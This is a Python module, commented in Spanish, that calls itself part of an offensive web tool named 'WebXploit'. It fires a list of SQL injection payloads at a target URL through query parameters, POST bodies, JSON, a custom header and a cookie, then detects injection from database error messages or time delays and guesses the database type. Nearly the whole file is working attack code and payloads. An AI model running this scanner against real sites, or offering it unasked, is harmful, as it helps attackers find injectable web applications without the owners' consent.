"""
sqli_attack.py – Módulo avanzado para detección y confirmación de SQLi
Parte de la herramienta ofensiva M4 – WebXploit
"""

import requests
import random
import time
from colorama import Fore, Style
import re

# Payloads de prueba para diferentes vectores SQLi (GET, POST, Headers, Cookies, JSON)
SQLI_PAYLOADS = [
    "' OR 1=1--",
    "' OR 'a'='a",
    "' AND 1=0 UNION SELECT NULL--",
    "1; SELECT SLEEP(5)--",
    "' OR EXISTS(SELECT * FROM users)--",
    "\" OR 1=1--",
    "' OR 'x'='x'--",
    "admin' --",
    "admin" + chr(0),
]

ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error",
    "ORA-",
    "sql error",
    "pg_query",
    "unterminated string constant"
]

DB_FINGERPRINT = {
    "MySQL": ["mysql", "you have an error"],
    "PostgreSQL": ["pg_query", "postgres"],
    "MSSQL": ["mssql", "unclosed quotation mark"],
    "Oracle": ["ORA-", "quoted string not properly terminated"]
}

def detectar_sqli(url, metodo="GET", headers=None, cookies=None, delay=1):
    print(f"\n{Fore.MAGENTA}[MODO PRO] Iniciando prueba avanzada de SQLi...{Style.RESET_ALL}")
    vulnerable = False

    headers = headers or {}
    cookies = cookies or {}

    for i, payload in enumerate(SQLI_PAYLOADS):
        print(f"{Fore.CYAN}[*] Probando payload {i+1}/{len(SQLI_PAYLOADS)}: {payload}{Style.RESET_ALL}")
        try:
            if metodo == "GET":
                test_url = f"{url}?vulnerable={payload}"
                response = requests.get(test_url, headers=headers, cookies=cookies, timeout=10)
            elif metodo == "POST":
                response = requests.post(url, data={"vulnerable": payload}, headers=headers, cookies=cookies, timeout=10)
            elif metodo == "JSON":
                response = requests.post(url, json={"vulnerable": payload}, headers=headers, cookies=cookies, timeout=10)
            elif metodo == "HEADERS":
                custom_headers = headers.copy()
                custom_headers["X-Inject"] = payload
                response = requests.get(url, headers=custom_headers, cookies=cookies, timeout=10)
            elif metodo == "COOKIE":
                custom_cookies = cookies.copy()
                custom_cookies["session"] = payload
                response = requests.get(url, headers=headers, cookies=custom_cookies, timeout=10)
            else:
                continue

            content = response.text.lower()
            status = response.status_code

            if any(pat in content for pat in ERROR_PATTERNS):
                vulnerable = True
                print(f"{Fore.RED}[!] SQLi detectada con payload: {payload}{Style.RESET_ALL}")
                for db, patrones in DB_FINGERPRINT.items():
                    if any(pat in content for pat in patrones):
                        print(f"{Fore.YELLOW}    [+] Posible base de datos: {db}{Style.RESET_ALL}")
                break
            elif "sleep" in payload and response.elapsed.total_seconds() > 4:
                vulnerable = True
                print(f"{Fore.RED}[!] Posible SQLi ciega (Time-based): {payload}{Style.RESET_ALL}")
                break
            elif status == 500:
                print(f"{Fore.YELLOW}[!] Error 500 detectado (potencial vulnerabilidad): {payload}{Style.RESET_ALL}")

            time.sleep(delay)

        except Exception as e:
            print(f"{Fore.YELLOW}[ERROR] Fallo al probar payload {payload}: {e}{Style.RESET_ALL}")

    if not vulnerable:
        print(f"{Fore.GREEN}[✓] No se detectaron signos claros de SQLi.{Style.RESET_ALL}")

    return vulnerable

def analizar_todos_vectores(url, headers=None, cookies=None):
    print(f"{Fore.BLUE}\n[ANÁLISIS MÚLTIPLE] Iniciando análisis de vectores: GET, POST, HEADERS, JSON, COOKIE...{Style.RESET_ALL}")
    vectores = ["GET", "POST", "JSON", "HEADERS", "COOKIE"]
    for vector in vectores:
        print(f"{Fore.CYAN}\n--- Proceso en vector: {vector} ---{Style.RESET_ALL}")
        detectar_sqli(url, metodo=vector, headers=headers, cookies=cookies, delay=0.5)
